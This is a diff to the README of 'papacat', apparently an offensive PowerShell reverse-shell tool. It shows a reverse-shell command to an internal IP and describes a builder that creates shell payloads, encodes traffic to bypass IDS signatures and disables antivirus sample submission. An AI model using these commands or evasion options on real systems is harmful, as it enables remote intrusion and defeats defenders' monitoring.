@@ -102,8 +102,10 @@ papacat -c 192.168.1.72 -ep -p 666 -v
 
 # papacat Automation - Obfuscation
 
-[Builder.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1) cmdlet automates the creation of papacat reverse tcp shell<br />( crandle + payload + handler ) and encode\decode tcp data flow if invoked -force 'true' param.<br />
-GitHub: [https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1)
+[Builder.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1) cmdlet automates the creation of papacat reverse tcp shell ( crandle + payload + handler )<br />and encode\decode tcp data flow if invoked `-action 'rawcat' -force 'true'` parameters.<br />
+GitHub: [https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1](https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_shell/Builder.ps1)<br />
+Encode\Decode tcp data flow: [ired.team/bypassing-ids-signatures-with-simple-reverse-shells](https://www.ired.team/offensive-security/defense-evasion/bypassing-ids-signatures-with-simple-reverse-shells)
+
 
 <br />
 
@@ -116,7 +118,7 @@ GitHub: [https://github.com/r00t-3xp10it/redpill/blob/main/utils/papacat_rev_she
 |TimeOut|seconds to wait before giving up on listening|120|user_input|
 |serverPort|Python3 http.server port number|8080|user_input|
 |PayloadPort|Reverse tcp shell port number (payload)|666|user_input|
-|Force|Disable AV sample submition (local + remote)|false|true|
+|Force|Disable AV sample submition (local + remote)<br />and encodes client\server tcp data flow if invoked together with -action 'rawcat'|false|true|
 
 <br />
 
